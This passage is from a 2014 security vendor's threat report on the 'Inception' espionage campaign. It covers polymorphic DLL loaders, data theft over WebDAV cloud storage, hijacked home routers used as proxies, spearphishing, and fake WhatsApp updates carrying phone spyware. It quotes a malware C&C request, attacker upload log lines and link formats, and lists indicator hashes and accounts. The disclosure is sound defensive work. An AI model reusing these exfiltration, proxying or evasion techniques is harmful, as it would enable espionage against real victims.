dictionary – “ acholias ” , “ arzner ” , “ bicorporate ” , “ crockrell ” , “ damnatorily ” etc .
13
DLL payload
Looking at one of the dropped dlls we can see the authors originally called it
95Num3P3gm.dll.polymorphed.dll . When executed it will rebuild the original dll
( 95Num3p3gm.dll , presumably ) , load it from memory and pass over execution .
In the early stages of our research , most other payloads followed the same
naming convention , eg . , fvK3J15B5d . DLL.polymorphed . DLL ;
LvwU9gnFO.DLL.polymorphed . DLL ; NR5vaFTe9R.DLL.polymorphed . DLL ;
hs78lg7x5F.DLL.polymorphed . DLL , etc . More recently collected samples no
longer contain the “ polymorphed ” string .
It is hard to describe the polymorphed dlls with any real depth , as there is little
consistency between them . When two nearly identical dlls are encoded using the
polymorphic scheme there is very little code in common . The call graphs are
different and key functions have varying number of arguments . The polymorphing
mechanism also generates , and inserts , unique functions all of which make calls
to different floating - point operations – all done just to obfuscate the actual
decoding process . The sizes of buffers allocated are also randomized to mask
their intent .
14
A portion of one of the dynamically generated functions .
What is common is that somewhere along the execution cycle is one extremely
large function ( over 200 kb in length ) where early in a large allocation is made
where the un - obfuscated binary will be placed . The binary is then built from de-
obfuscating segments of it that have been dispersed through the ‘ .rdata’ section .
The order , size , and locations of these segments vary from build to build but
somewhere near the end of the large function there will be a call to a subfunction
that loads the PE image into memory , followed by a call to free the PE image
allocation from memory . Simply halting execution before this function call permits
a researcher to extract the reconstructed DLL from memory .
15
Here , pausing execution before the call to ‘ load_pe_from_memory’ reveals the
extracted PE at the memory address pointed to by edx .
This reconstructed DLL , once loaded , will decode a configuration structure from
its ‘ .data’ section which contains three important details : the name of the
encrypted data file dropped by the VBScript ; the AES key used to decrypt the file ;
and the name of a unique global mutex to hold while running to prevent multiple
instances .
This configuration information is used to load the encrypted file into memory and
decrypt it . This turns out to be yet another dll . The first ordinal exported by this dll
is located and then called , passing in the configuration and the name of the
encrypted file on disk as parameters .
16
This last dll is the heart of the threat ( originally called q5Byo.dll in this instance .
This file contains the true intent of this campaign . It is designed as a survey tool .
The PE file gathers system information including OS version , computer name ,
user name , user group membership , the process it is running in , locale ID ’s , as
well as system drive and volume information . All of this is encrypted and then
sent to cloud storage via WebDAV .
17
The malware installation chain
18
WebDAV cloud usage
WebDAV is a communication standard that allows file management over HTTP
or HTTPS . Windows allows WebDAV sessions to be mapped as network
resources .
The use of WebDAV as the communication channel is atypical for most malware
samples we see . By using a network resource , the actual web traffic originates
from the system itself , and not from the process in which the malware resides .
Additionally , once the resource is established , the malware can transfer files to
and from the command and control servers using standard file IO commands .
All the authentication information for the WebDAV session including the URL ,
folders , path , user name , and password is stored within this last DLL in another
AES - encrypted configuration structure in the binary .
A unique path , username , and password were used for each malware instance
we ’ve seen in the wild . This allows the attackers to uniquely identify every
targeted attack and track how successful each phishing campaign is .
Also contained within the configuration structure is information on how to name
the survey data on the remote file server . The binary reads from its configuration
a string on how to generate the remote filename , and a list of extensions to use .
An example would be “ _ 1 - 7d_0 - 8s ” , [ “ TIF ” , “ TAR ” , “ SIT ” ] which instructs the
binary to generate a filename with 1 to 7 numeric digit characters followed by 0 to
8 ASCII letters with one of the three listed extensions such as “ 664gher . TAR ” .
The survey is then uploaded to the server in a specified folder with the generated
name .
Files are compressed using a modified LZMA - compression and encrypted using
AES cipher - block - chaining ( CBC ) before being uploaded to the cloud server .
The binary also checks a separate folder on the cloud service designated to
contain new configuration information . If such a file is present on the server , the
malware downloads the new configuration file then deletes it from the server .
19
The cloud storage provider in every case we have seen was the Swedish
company CloudMe.com , which offers free and paid WebDAV cloud storage .
The URI model used by the malware is
http://webdav.cloudme.com/%username%/CloudDrive/ which is a direct
reference to file storage .
It must be noted that the CloudMe service is not actively spreading the malicious
content ; the attackers are only using it for storing their files .
We notified CloudMe.com about the abuse of their services . Their CEO , Mr.
Daniel Arthursson , was none too happy about this , and was very helpful in our
further research . CloudMe has shared a great deal of log information related to
this attack . These indicate that there are many other accounts ( over 100 ) likely
related to this attack system . We have no way of verifying this with absolute
certainty , but this is what we regard as a high confidence assumption .
20
Distribution of logged victim connections towards CloudMe .
The cloud accounts are not used for one - way communication only . The malware
also checks configured subfolders for updates ; and if these are found they will be
downloaded , decrypted and used as appropriate .
One such case is the franko7046 account , used against the previously
mentioned bank CEO . In this account there was hidden another encrypted
configuration file which the malware downloaded and decrypted .
Above : The configuration file of the depp3353 account . Password is redacted .
21
This is how we found the depp3353 account . In this new account there was
another surprise waiting for us – a download folder with two new encrypted files ,
921.bin and 922.bin . Once decrypted , these turned out to be PE executables .
Downloaded plugins : Cloud persistence
The two new executables are plugins - quite similar to each other and obviously
compiled on the same setup . They are lightweight and intended to pull specific
survey information from their target . Of interest , both of the DLLs originally had
the same internal name ( 78wO13YrJ0cB.dll ) . Presumably the same PE
sanitization script and parameters were used on both .
None of these plugins contain any means of CnC communication . Instead , when
they are executed they are passed a pointer to a function to use for sending data
back home . Neither are they ever written to disk . They are executed in memory
only , and once they have completed the memory is freed . This makes these
modules extremely stealthy , flexible and compatible with multiple toolsets
independent of what CnC method is being used .
921.bin retrieves several datapoints about the infected machine : Domain info ; a
list of running processes with all loaded modules in each ; the list of installed
software ; and a complete hardware profile of the target machine . 922.bin
compiles a dirwalk – a complete listing of every file path – of each fixed drive . All
of this information is exfiltrated back via the same WebDAV connection .
This model makes it possible to do the intrusion in steps , with verification stages
in between ; and the files will not be easily found on affected computers .
Based on the information gathered from these modules , the attackers appear to
move to the next stage of their attack by placing more new components on the
WebDAV shares . Information about these uploads is limited by the fact that we
do not have the AES keys to decrypt much of the uploaded data , but we have
been able to see some upload patterns .
What we assume to be third - stage plugins appear on the shares as * .bin files of
roughly 72 kb . As with other plugins , these are downloaded and deleted from the
share in one go . However , the next day , another * .bin file of the same size will be
uploaded to the share . This is a pattern that repeats itself over all live accounts . It
seems that because the plugins exist in memory only , they are injected daily to
ensure persistence on victim computers . Our theory is that this malware is a
more typical datastealer , and we have observed that after this type of file is
planted on the account , encrypted data uploads from compromised users
increase .
22
The Sheep and the Wolves
Victims of this attack will connect using the Windows WebDAV redirector , and
the HTTP request user - agent string will reflect this . For Windows XP this will
typically be “ Microsoft - WebDAV - MiniRedir/5.1.2600 ” , and for Windows 7 a
common user - agent is “ Microsoft - WebDAV - MiniRedir/6.1.7601 ” .
Security researchers – and there are a few of them - connect in a variety of ways ;
first of all , we see a number of connections that are indistinguishable from the
way victims connect . This happens when researchers use lab machines with live
internet access to run the malware . The only way we can tell these are
researchers is because they connect from IP address ranges that are unlikely to
be victims ; and they also tend to consist of short - lived sessions .
Some researchers set up scheduled tasks to scan the shares for new updates
and malware . We see a few variations of these – one typical configuration is
where the requests contain a Python - related user - agent string .
Attackers , on the other hand , do n’t appear to use Windows .
Common across multiple accounts , multiple IP ’s , and over time , is that the
probable attackers have used a HTTP user - agent of “ davfs2/1.4.6 neon/0.29.6 ” .
We know these are not researchers , because we can see malware files being
uploaded by them :
[ 17/Sep/2014:09:42:38 + 0200 ] " PUT
/white3946/CloudDrive / QxM9C / st / V1oINDJtnqy/1768.bin
HTTP/1.0 " 201 0 " - " " davfs2/1.4.6 neon/0.29.6 "
Above : Log entry for the account white3946 . We have been unable to locate the
malware that uses this account .
We have a log fragment in which the attackers uploaded a sequential series of
updates ( from 1746.bin to 1774.bin ) within 1.5 hours on Sept 17th , spread over
27 different accounts and using 27 different IP addresses in the process .
The user - agent string shows that attackers likely have used a client based on the
open source davfs2 file system for Linux to mount the WebDAV shares .
23
This client is used when uploading new malware , but also when the attackers
scan their shares for new victim updates , in which case the shares are
enumerated by requests in a scheduled manner .
An attacker scans the tem5842 account for updates .
At intervals , scans hop to new IP addresses .
The attackers have used a large number of IP addresses to access the shares .
As mentioned above , there is a rotation scheme in place in which a new IP
address will be used after a few minutes of access against CloudMe accounts .
These IP ’s are distributed widely over geographical locations and service
providers , with a heavy bias towards South Korean ranges .
24
S. Korea                                 85    Australia                                  1
China                                     7    Austria                                    1
United States                             7    Bulgaria                                   1
Brazil                                    5    Canada                                     1
Sweden                                    3    Denmark                                    1
Czech Republic                            2    France                                     1
Norway                                    2    Germany                                    1
Romania                                   2    Kuwait                                     1
Russia                                    2    Latvia                                     1
Spain                                     2    Ukraine                                    1
Distribution of attacker IP addresses
At first we thought these IP ’s belonged to some commercial proxy service ,
particularly since several such proxy services also offer IP rotation . However , this
turned out to be a wrong assumption .
25
PART II :
Support infrastructure
26
An embedded device proxy network
A superficial examination of the proxy IP addresses that connected to CloudMe
showed them to be internet - connected devices of various kinds . Many were
Korean Tera - EP home routers ; but there were several other products
represented .
It is believed that the attackers were able to compromise these devices based on
poor configurations or default credentials .
We were able to do some forensic work on a compromised Tera - EP TE-800
device and discovered another dimension of the attacker ’s infrastructure .
27
Router malware
Under the ramfs mounted partition we found a stripped and statically linked
MIPS - el binary named tail- . Instances of this were also found under the running
process list .
tail- serves as a SOCKS proxy for the attackers . Each sample of the binary we
were able to acquire was configured with a unique 32byte blowfish key and a
small , encrypted section appended to the end of the binary .
Upon execution the binary uses its hardcoded key to decrypt the configuration
section and retrieve the listening port to use for incoming connections . This acts
as a management interface . From here the attackers can request a specific port
to be opened as one of the following types : SOCKET , SOCKSS , SOCKAT ,
SOCKS5 , or STATUSPORT .
To prevent anyone else from accessing this service all communication on the
management interface is encrypted using the same blowfish key . This means
that the attackers must maintain a list of where each of these implants are
installed , as well as what port and key each is configured to use .
This setup makes it difficult to identify embedded devices compromised with this
malware by scanning open ports .
In the wild we witnessed the attackers connect to the management port and
request SOCKSS connections . This would open the specified port and wait for
configuration data , which consists of a domain name ( webdav.cloudme.com ) , the
destination port , and a variable length RC4 key , all of which encrypted using the
blowfish key . Once received the malware would attempt to connect to the
domain name on the specified port and would start tunneling all traffic received
from the SOCKSS port to the destination and vise - versa . The communication
between the attacker and the SOCKSS is encoded using the RC4 key . The
graphic below illustrates a typical session .
28
Additional servers
The router proxy network provides another layer of indirection masking the
attackers’ infrastructure . However , because we captured traffic through one of
these embedded devices we could identify other parts of their operation .
We identified four IP addresses that connected to the proxy malware :
Cloud enumerator :
Apparently a rented server at AS34224 NETERRA - AS , Bulgaria
This host belongs to a Bulgarian VPS service and would use the router proxy to
connect to webdav.cloudme.com . This host does all scanning of webdav shares
for stolen user data , and also uploads new malware components .
Health checker :
Apparently a rented server at AS5577 ROOT root SA , Luxembourg .
This IP would make connections hourly and poll the status of the router proxy
malware . This machine is most likely used to track which compromised routers
are currently available for use .
Unlocker :
Apparently a rented server at AS52048 DATACLUB DataClub S.A. Latvia .
Traffic from this IP had a very specific purpose : It unlocked routers for proxying in
connection with the sending of phishing emails .
In the wild we observed this IP connect to our router on the malware
management port and specify a SOCKSS proxy port to be opened . Immediately
after , the newly opened port would be connected to by another IP and used to
send phishing emails with malicious attachments .
However , later we observed that the Email sender IP at VOLIA vanished and the
Unlocker server taking over its role as well .
Email sender :
An IP at AS25229 VOLIA - AS , Ukraine . Possibly a compromised host .
After a router SOCKSS port was opened by Unlocker , this IP would connect to
the opened port and tunnel its email traffic through the router .
Each of these connections used the correct encryption key , so we know that
these accesses came from the attackers and not some opportunistic third party .
29
Mail proxies :
Through our router monitoring we identified two mail proxies used by the
attackers . We were later notified by Symantec ( thanks , guys ! ) about a third .
These servers were hosted on domains that were registered by the attackers ,
using domain names clearly meant to look legitimate . This is the only time we
have seen attackers register domains in this investigation .
The mail proxies were :
haarmannsi.cz        : Spoof of the legitimate domain haarmannsi.com
sanygroup.co.uk      : Spoof of the legitimate domain sanygroup.com
ecolines.es          : Spoof of the legitimate domain ecolines.net
Registrant WHOIS information seems forged :
haarmannsi.cz
name :       Sanyi TERRAS
address : R. FREI CANECA 1120
SAO PAULO
01307 - 003
BR
e - mail :     sanyi_terras@outlook.com
created : 12.06.2014
NS :         ns*.frankdomains.com
sanygroup.co.uk :
name :       Alan
address : Uddmansgatan 13
Pitea
Norrbottenalän
94471
SE
created : 06.05.2014
NS :         ns*.domains4bitcoins.com
ecolines.es :
name :         Lyisa Almeida
address : N / A
created : 04.06.2014
NS :           ns*.frankdomains.com
.
30
Observed phishing emails
The connections made from the Ukrainian host to the router were interesting .
After being proxied though the router , each of these would authenticate with one
of the dedicated mail proxies and send out phishing attacks .
From captured traffic it appears that the mail proxies have SOCKSv5 services
running on obscure high ports . We have documented that the attackers log in to
these using apparently randomly generated usernames and passwords , a unique
pair for each server . The mail proxy would then relay the spearphishing mail as
seen below .
Above : Captured SMTP session , sending the malicious attachment MQ1474.doc
This way the attack can be mistaken to come from legitimate businesses and
trusted organizations . In some cases the organization from which the phishing
email originates would appear to be a known associate to the target .
31
The email shown above was one of a number of messages sent to targets in the
oil industry . Investigating the target email addresses , we saw several of these
were found in this public document from the World Petroleum Council , including
some addresses that are , at the present time , no longer valid .
And then , the ground shifted again .
32
PART III :
Attacks on mobile devices
33
One of the spearphishing mails we observed coming through the router network
was this one , sent to an address under the gov.py ( Government of Paraguay )
domain .
Get WhatsApp now for your iPhone , Android , BlackBerry or Windows Phone
There was no executable attachment in this mail , but instead a link shortened by
the URL shortener service bit.ly , with the underlying link pointing to an IP address
on a Dutch hosting service . Clicking that link from a Windows PC only yielded a
redirection to the BBC homepages , and using other devices did not give more
data .
The bit.ly service does however provide information on the user creating the
shortened link , and other links associated with this account . In this case , the user
was named nicolatesla53 .
34
The nicolatesla53 bit.ly profile page
The nicolatesla53 account was created in July 2014 . From Oct 24th to Nov 21st
this user created nearly 10000 shortened links – we harvested 9990 unique
ones . Three IP addresses were used for these links :
82.221.100.55
82.221.100.60
94.102.50.60
The links themselves were on this format :
http://server_ip / page / index?id = target_identifier&type2=action_code
As far as we were able to tell , there were three main types of action_code :
743 : Serve malware disguised as WhatsApp updates
1024 : Serve malware disguised as Viber updates
other : Serve MMS phishing content . The code identifies mobile operator and
determines which logo will be displayed when the user follows the link .
35
MMS Phishing
We have no sample of the actual MMS phishing messages apparently being
sent , but we can see the page served when a user clicks a spammed link . This is
just a dialogue box asking for the password presumably included in the initial
message , and the next stage likely involves download of malicious content .
The password screen for action code 16611 ( TELE2 )
We were in the middle of harvesting the servers for data on the various action
codes when they all were abruptly taken offline ; so our data on which mobile
operators are targeted is not complete . We managed to get 66 of a total of 190 .
The ones we know of are shown below . A full breakdown of mobile operators
and related links is included in the appendix .
36
The composition of links created for the various mobile operators is quite
interesting , as one can speculate that they represent amount of actual or planned
attacks in different countries . With the top three operators being Vodafone , T-
Mobile and Proximus ( Belgacom ) it seems these apparent phishing attacks are
less focused on the Russian sphere than the previously discussed malware .
This map is not complete , though . It represents only about 35% ( 66/190 ) of all
mobile operators targeted and 66% ( 3152/4781 ) of all phishing links we managed
to harvest . In addition , some operators like Vodafone are global actors , so the
map might show an unfair intensity in their HQ locations .
MMS phishing heat map
The rest of the bit.ly links used the action codes 743 or 1024 . And now things
really get interesting . By using mobile device HTTP User - Agents we were able to
trigger downloads of malware components from some of these links .
37
Mobile malware : Android
Accessing the link from an Android User - Agent initiated a download of an
Android installer package named WhatsAppUpdate.apk . The package we
analyzed was 1.2 MB in size .
The apparent main purpose of this malware is to record phone call audio .
Recordings are stored as * .mp4 files , and uploaded to the attackers periodically .
The malware is able to collect a lot of other information , not all of which is
actually used :
•    Account data
•    Location
•    Contacts
•    External and Internal Storage ( files written )
•    Audio ( microphone )
•    Outgoing calls
•    Incoming calls
•    Call log
•    Calendar
•    Browser bookmarks
•    Incoming SMS
Through the encrypted C&C protocol , the attackers can issue commands and
binary updates to the malware .
It uses a custom DAO / Database scheme which uses accounts belonging to the
virtual community Live Journal ( livejournal.com ) as data stores . Three such
accounts were found hardcoded in the package :
The accounts all state that they belong to Iranian users . This is very likely false .
38
The text in these posts starts first out in cleartext , but quickly turns into
unreadable gibberish . The HTML source code reveals that the encoded portion is
encapsulated in blog - index tags :
The three accounts contain different configuration blocks pointing to C&C servers
apparently located in Poland , Germany and Russia , respectively . Based on
registration data and folder configuration we believe these are legitimate but
compromised Joomla servers .
And then an unexpected oddity shows up in the Java source :
The sign in front of SizeRandomStr is “ Truti ” - a Hindi word meaning “ Error ” .
39
We were also able to download a similar malware sample ( BrowserUpdate.apk )
from one of the C&C servers . This sample used different online accounts for its
DAO / database functionality , but is otherwise quite similar to the first .
40
Mobile malware : Apple IOS
Using an IOS User - Agent triggered the download of a Debian installer package ,
WhatsAppUpdate.deb , also 1.2Mb in size .
This application impersonates a Cydia installer , and can only be installed on a
jailbroken phone .
Once installed , it may collect
•    Device platform , name , model , system name , system version
•    ICCID
•    User ’s address book
•    Roaming status
•    Phone number
•    Carrierbundlename
•    Iso country name
•    Carrier name
•    Wifi status
•    MAC address
•    Device battery level
•    Free and total space
•    Cpu frequency and count
•    Total and user memory
•    Maxsocketbuffersize
•    Language local identifier and language display name
•    Default and local time zone
•    Account data : AccountAvailableServiceTypes , AccountKind ,
AccountSocialEnabled , etc
•    AppleID
•    CreditDisplayString
•    DSPersonID
•    IOS specific data ; ex LastBackupComputerName ,
LastBackupComputerType , iTunes.store - UserName , iTunes.store-
downloaded - apps etc .
41
These data are encrypted and uploaded to an FTP account which is taken from
an encrypted configuration file named /usr / bin / cores .
In this particular case , the FTP account is located on a legitimate ( if struggling )
hosting service in the UK .
In this case , there ’s another clue :
The project path in the package contains the name JohnClerk .
The WhatsAppUpdate project seems derived from an earlier template named
SkypeUpdate .
42
Mobile malware : Blackberry
By now , it came as no surprise when we triggered a download with a BlackBerry
User - Agent . The initial download was a Java Applications Descriptor , a text file
designed for Over - The - Air installation of Java - based applications . This JAD file
contained the locations of the two Blackberry * .COD binaries which we then
could download directly .
The application impersonates a settings utility . This collects :
•    deviceName , manufacturerName
•    platformVersion , softwareVersion
•    brandVendorId , brandVersion
•    total and free flash size of the device
•    amount of memory / storage already allocated
•    ownerName , ownerInformation
•    Phone mumber
•    PIN
•    IMSI
•    IMEI
•    mcc and mnc ( Mobile Carrier ID )
•    cellID
•    Location area code
•    isPasswordEnabled
•    Battery data ( level , temperature , voltage , etc )
•    Installed applications
•    Address book
•    APChannel
•    Connected Network Type
•    BSSID
•    DataRate
•    Profile Name
•    RadioBand
•    SecurityCategory
•    SignalLevel
•    SSID
Collected data will be uploaded to a DynDNS domain currently hosted on a US
webhosting service .
43
“ God_Save_The_Queen ” is used as a reference in one of the Blackberry
binaries .
Since these COD files are also compiled Java code , they are possible to
decompile to original source code . In a similar fashion to the Android version , we
find interesting strings there . This time they are in Arabic :
“ Reading files ” in Arabic
44
PART IV :
Attribution
45
Timelines and activity patterns
The earliest sample of Inception - related malware we have been able to obtain ,
was submitted to us in June 2014 . However , decoy document metadata shows
that it was created late May. The related cloud account was created just before
that . An examination of the other documents associated with the attacks show
that they have been created at a steady pace all through summer and autumn
2014 and attacks are still ongoing .
Of interest is also the attackers’ activity patterns over the 24h cycle . The main
upload of new components to shares seems to be divided over two high – activity
periods : 6:00 -10:00 UTC and 17:00 - 21:00 UTC . No uploads were seen
between 23:00 and 05:00 UTC .
It is however doubtful how indicative these timeframes are . To illustrate , we
looked into another and more obscure timing factor : The timing of the AES
InitVector random seeds . A random seed is the initial value passed into a
pseudo - randomizer function . The malware uses the random output to create
what is known as an InitVector - a starting point for the AES
encryption / decryption function .
The code used in some of the DLLs indicate that the attackers tend to use the C
time ( ) function to generate random seeds . This function returns values of
granularity down to seconds . Thus random seeds , and ultimately the InitVectors ,
are functions of these quite coarse units of time .
The encrypted files uploaded to the WebDAV shares come with their InitVectors
stored at the end of the file . Since we know the time window to be within a few
days of the upload time we were able to brute force the time values that would
generate the corresponding InitVectors . Thus , we were able to say to the second
when the file was created – and most times were identified to be in the range
1500 - 2200 GMT .
Unfortunately , we had to reject these data . The file creation times turned out to
be hours after the files themselves were uploaded to the WebDAV share . Either
the attackers’ system clock is wrong or a fixed offset is added to the random
seed . Either way , the data ca n’t be trusted ; and shows that nothing can be taken
at face value .
46
The Chinese connection
On at least two occasions during our surveillance of the Inception framework , the
malware downloaded something unexpected and wholly different from what we
have discussed until now .
These files were downloaded as encrypted * .bin files from the accounts
carter0648 and frogs6352 . When decrypted , these turned out to be dropper
packages containing one dropper executable clearly created for the Inception
framework , and one other , very different executable .
This executable , ( sccm.exe , md5 dd8790455109497d49c2fa2442cf16f7 ) is a
classical Chinese APT implant . It is a downloader and remote shell program ,
designed to connect to a C&C server to interact with the attacker and/or
download more malware .
The C&C server in this case is ict32.msname.org .
When connecting to this server , sccm.exe issues the following request :
POST /check.jsp HTTP/1.1
Accept : * /* .. Accept - Language : en - us
Content - Type : application / octet - stream
Accept - Encoding : gzip , deflate
User - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ; SV1 )
Host : www.antivir.com
Content - Length : 8
Connection : Keep - Alive
Cache - Control : no - cache
This C&C domain is used by many other malwares related to sccm.exe ; some of
which share obvious connections to the Quarian malware family , a known APT
intrusion tool .
This development was unexpected for several reasons . First of all , it apparently
breaks the strict , obfuscatory operational security built into the Inception
framework . Inception has the capacity to perform all steps needed for scouting
out and exfiltrating data without resorting to traditional hosted command &
control . By using a well - understood APT tool and a known malicious C&C
domain name , the attackers permit much clearer attribution .
47
Another factor which is out of character is the coding style . All Inception - related
malware is written using Visual Studio 2010 . The downloaded sccm.exe is written
using Visual C++ 6 ; and has a PE header compile date of October 2010 .
This date can be forged , and indeed , all Inception - related malware has some
level of forgery in the compile dates . However , the sccm.exe compile date
matches the Quarian developer toolset and coding style to a better degree than
the other files distributed through Inception .
Then there is the C&C domain used . According to DomainTools.com the
msname.org domain registration timed out September 27th 2014 . It was left
inactive and was not renewed until Nov 12th . This means that the attackers
distributed malware that would be out of action for a long time ( last distribution of
sccm.exe was September 26th ) .
Because of all this we consider sccm.exe as an unreliable indicator . It is likely to
be a red herring purposefully placed on shares where the attackers have seen
signs of access by security researchers .
An odd indicator
At one instance the attackers seem to have slipped up . Instead of using their
scheduled task , they apparently did something manually on a WebDAV share .
This is visible because the request came from an apparent attacker IP , but used
yet another User - Agent : “ gvfs/1.12.3 ” .
Gvfs is the virtual filesystem for Gnome desktop . The action on the account was
abnormal as well ; an apparent file upload :
83.53.147.144 - - [ 02/Sep/2014:09:53:56 + 0200 ] " PUT
/tem5842/Documento%20sin%20t%C3%ADtulo HTTP/1.1 " 408 0 " - "
" gvfs/1.12.3 "
“ Documento sin título ” means “ Untitled document ” in Spanish .
When WebDAV shares are mapped up as drives by the operating system , any
action taken by the attacker follows the same pattern as on the attacker ’s local
drive . In the case above , it seems the attacker attempted to edit a new
document , which by default is given the name “ Untitled document ” in Gnome .
This might indicate that the attacker ’s operating system language is Spanish .
Of course , Spanish is one of the world ’s most widespread languages , so one
can not infer much from this . There is even a small possibility that the
phenomenon is a pure artifact ; for example that a Spanish - speaking researcher
connected to the same account using the same Linux - based setup as the
attackers .
48
Similarities with Red October
This attack system shares a number of properties that are somewhat similar with
the Red October campaigns detailed by Kaspersky Labs in 2013 .
For more information about this see :
The " Red October " Campaign - An Advanced Cyber Espionage Network
Targeting Diplomatic and Government Agencies
-    Target countries and verticals overlap to some extent
-    The topics of some decoy documents are the same ( eg . “ Diplomatic
Car for sale ” )
-    Similar overall loading architecture , with dropping of encrypted binaries
that are later decrypted and loaded
-    Exploited documents contain certain similarities ( i.e. the magic string
“ PT@T ” used as a marker to locate the shellcode )
However , there are also clear differences . The code is fully rewritten ; there
appears to be little code overlap , at least in the initial stage malware . The coding
style is different , with different solutions to programmatic problems , different use
of exception handling , and different use of C++ classes . It ’s hard to believe that
the same programmers are responsible for the two code bases .
The Red October malware contained linguistic markers that pointed towards
Russian speaking attackers . No such clues have been found in the Inception-
related malware ; there is a marked difference in the attention to detail and
information leakage .
It is certainly possible that the same people have organized both Inception and
Red October , but there are no clear indications to this effect .
49
Strings in malware
The Windows - based malware in this paper generally contains very few
noticeable strings apart from what is commonly found in software , and clearly
randomized strings . What exists – like the word “ polymorphed ” in the early DLL
versions - is standard English with few discerning features .
This changes a bit when we look at the mobile malware . In the Android malware
we find Hindi comments in the Java source code . In the Iphone malware we find
project paths referencing one “ JohnClerk ” , and a few typos like “ conutry ” . In one
of the Blackberry binaries we find the string “ God_Save_The_Queen ” , a rather
blunt hint towards Britain , as well as Arabic log strings .
These and other indicators have led us to conclude that the Inception attackers
are setting a new standard for deliberate disinformation and red herrings in a
malware espionage operation . Some clues might have been added by accident ,
but none of these indicators can be trusted in any way . Thus we are not going to
assume anything about who might be behind these attacks .
50
Conclusion
The whole Inception setup shows signs of automation and seasoned
programming . The amount of layers used in this scheme to protect the payload
of their attack seems excessively paranoid . Not only is the initial DLL apparently
polymorphed using some backend tool – the compile time stamps in the PE
header are clearly forged , resources are removed so as not to give away any
location information , and import tables are shuffled around , rendering import
hashes ( aka imphashes ) useless .
The names of the files both when dropped and their original names along with
the callback directories , paths and mutexes used all seem to be dynamically
generated .
The attackers utilize compromised embedded devices – typically routers- on the
Internet as well as multiple dedicated hosting providers and VPN services to
mask their identity from the cloud storage provider and others . The same router
botnet is used as a spreading and management platform for attacks on mobile
devices as well .
This suggests that this a large campaign and we ’ve only seeing the beginning of
it . Initially many of the targets were located in Russia or related to Russian
interests , but as the campaign has evolved we have verified targets in countries
all over the world .
It is clear that this infrastructure model does not need to be applied solely against
a few targets , or even need to be hosted at CloudMe . The framework is generic ,
and will work as an attack platform for a multitude of purposes with very little
modification .
The attribution indicators point in different directions and ca n’t be given much
weight . These attacks can in theory be the creation of nation states or
resourceful private entities - we consider it very unlikely that they are performed
by one or just a few individuals .
© 2014 Blue Coat Systems , Inc. All rights reserved . Blue Coat , the Blue Coat logos , ProxySG , PacketShaper , CacheFlow , IntelligenceCenter , CacheEOS , CachePulse , Crossbeam ,
K9 , the K9 logo , DRTR , Mach5 , Packetwise , Policycenter , ProxyAV , ProxyClient , SGOs , WebPulse , Solera Networks , the Solera Networks logos , DeepSee , “ See Everything . Know
Everything . ” , “ Security Empowers Business ” , and BlueTouch are registered trademarks or trademarks of Blue Coat Systems , Inc. or its affiliates in the U.S. and certain other
countries . This list may not be complete , and the absence of a trademark from this list does not mean it is not a trademark of Blue Coat or that Blue Coat has stopped using the
trademark . All other trademarks mentioned in this document owned by third parties are the property of their respective owners . This document is for informational purposes
only . Blue Coat makes no warranties , express , implied , or statutory , as to the information in this document .
51
APPENDIX :
Exploited RTF sample md5 ’s :
0a0f5a4556c2a536ae7b81c14917ec98
19ad782b0c58037b60351780b0f43e43
20c2a4db77aabec46750878499c15354
23d6fabda409d7fc570c2238c5487a90
3ff9c9e3228b630b8a68a05d6c3e396d
4624da84cae0f8b689169e24be8f7410
4a4874fa5217a8523bf4d1954efb26ef
4dcdc1110d87e91cda19801755d0bcf2
516a514bf744efb5e74839ddaf02a540
5e3ecfd7928822f67fbb3cd9c83be841
685d9341228f18b0fd7373b7088e56a7
822d842704596a2cf918863ea2116633
8488303c2a0065d9ac8b5fecf1cb4fc9
8997d23b3d1bd96b596baee810333897
8cd5974a49a9d6c49294312bf09f64ed
9738faf227bcd12bcab577a0fb58744d
bc196dc8a14484e700169e1a78cf879e
b453ec7fd92bee23846ff36bf903ddc0
2fcbea8a344137421a86b046a6840265
Dropped first - stage DLL ’s
0bd0fd3cbbcfddc4048228ce08ca26c2
0bda50e05d575446de55d50c631afb53
0f12614fa7a9bf7bcc951eec7b78658d
2f9ca7680ec0945455988d91d9b325f8
352da994d867eb68a178bb7f2fb672bc
3a4a9d26c9c3c8d0fd697b036216319e
43587e5fcf6770259026ec2ca6f41aa6
4628082e11c75b078ff0465523598040
554d4c4da2e3603282b097b0e68ad11a
670ac2e315088d22b2cb92acffc3e997
71bdd14cbc96badb79dfb0f23c52a9ee
72f020b564bc9771e7efe203881f5ef9
80a7883c33a60b4c0178c9c8fb7d1440
84fa976d9ed693668b3f97d991da0e97
89d851cbd2dc1988bb053235414f8928
a5aeda357ba30d87c1187b644baad8a0
c3f2fb7840228924e5af17787e163e07
d007616dd3b2d52c30c0ebb0937e21b4
d171db37ef28f42740644f4028bcf727
d3886495935438f4a130d217d84ae8cb
ea0d80db2075f789fc88c3fdf6e3d93e
52
f2840be535fbaf8b15470d61967d527b
90c93c9b80bbf31dce8434a565a0ec7b
53
Downloaded second - stage plugins :
5c3de5b2762f4c5f91affaa6bcadd21b
86b2372297619b1a9d8ad5acdf1a6467
43112e09240caebb3c72855c9f6fc9e5
Downloaded Chinese malware , sccm.exe :
dd8790455109497d49c2fa2442cf16f7
Router proxy malware :
a6b2ce1cc02c902ba6374210faf786a3
83b383884405190683d748f4a95f48d4
62fc46151cfe1e57a8fa00065bde57b0
036fbc5bffd664bc369b467f9874fac4
488e54526aa45a47f7974b4c84c1469a
24a9bbb0d4418d97d9050a3dd085a188
b0c2466feb24519c133ee04748ff293f
62dc87d1d6b99ae2818a34932877c0a4
7c6727b173086df15aa1ca15f1572b3f
80528b1c4485eb1f4a306cff768151c5
e1d51aa28159c25121476ffe5f2fc692
Android malware :
046a3e7c376ba4b6eb21846db9fc02df
b0d1e42d342e56bc0d20627a7ef1f612
IOS malware ( WhatsAppUpdate.deb ) :
4e037e1e945e9ad4772430272512831c
Blackberry malware :
0fb60461d67cd4008e55feceeda0ee71
60dac48e555d139e29edaec41c85e2b4
54
Verified malicious CloudMe accounts ( based on malware ) :
garristone                 frogs6352                  droll5587
franko7046                 daw0996                    samantha2064
sanmorinostar              chak2488                   chloe7400
tem5842                    corn6814                   browner8674935
bimm4276                   james9611                  parker2339915
carter0648                 lisa.walker                young0498814
depp3353                   billder1405                hurris4124867
Likely malicious CloudMe accounts ( based on access patterns ) :
adams2350                  frog0722                   norbinov
adison8845                 gabriel.gonzalez           nul7782
allan1252                  garsia7871                 parker0519
altbrot                    gray7631                   poulokoel
amandarizweit              great2697                  pourater
anderson9357               green3287                  red6039
astanaforse                helen.scott                red6247
